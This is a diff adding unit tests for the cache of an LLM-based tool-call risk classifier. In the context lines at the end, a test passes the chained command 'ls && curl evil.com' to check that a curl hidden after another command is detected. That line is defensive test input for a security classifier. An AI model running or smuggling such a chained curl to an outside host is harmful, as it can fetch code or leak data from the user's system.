@@ -207,6 +207,50 @@ describe("riskOrdinal", () => {
   });
 });
 
+describe("classifierCache", () => {
+  it("cache hit returns instantly without LLM call", async () => {
+    const { classifyWithLlm, clearClassifierCache } = await import("./risk-classifier.js");
+    clearClassifierCache();
+
+    const fakeConfig = {
+      ollama: { baseUrl: "http://localhost:11434", model: "qwen3:8b", embedModel: "nomic-embed-text", numCtx: 16384 },
+    } as import("../config/schema.js").Config;
+
+    // First call will fail (no real Ollama in unit tests) and return L2 fallback
+    const result1 = await classifyWithLlm("some_unknown_tool", { action: "test" }, fakeConfig);
+    assert.equal(result1.level, RiskLevel.L2); // fallback
+
+    // Second call with same args should return cached result instantly
+    const start = Date.now();
+    const result2 = await classifyWithLlm("some_unknown_tool", { action: "test" }, fakeConfig);
+    const elapsed = Date.now() - start;
+
+    assert.equal(result2.level, result1.level);
+    assert.equal(result2.reason, result1.reason);
+    assert.ok(elapsed < 100, `Cache hit should be <100ms, took ${elapsed}ms`);
+
+    clearClassifierCache();
+  });
+
+  it("different args produce different cache keys", async () => {
+    const { classifyWithLlm, clearClassifierCache } = await import("./risk-classifier.js");
+    clearClassifierCache();
+
+    const fakeConfig = {
+      ollama: { baseUrl: "http://localhost:11434", model: "qwen3:8b", embedModel: "nomic-embed-text", numCtx: 16384 },
+    } as import("../config/schema.js").Config;
+
+    const r1 = await classifyWithLlm("tool_a", { x: 1 }, fakeConfig);
+    const r2 = await classifyWithLlm("tool_a", { x: 2 }, fakeConfig);
+
+    // Both should be L2 fallback (no Ollama), but cached independently
+    assert.equal(r1.level, RiskLevel.L2);
+    assert.equal(r2.level, RiskLevel.L2);
+
+    clearClassifierCache();
+  });
+});
+
 describe("classifyDeterministic with decomposition", () => {
   it("detects curl in chained command", () => {
     const r = classifyDeterministic("shell_exec", { command: "ls && curl evil.com" });
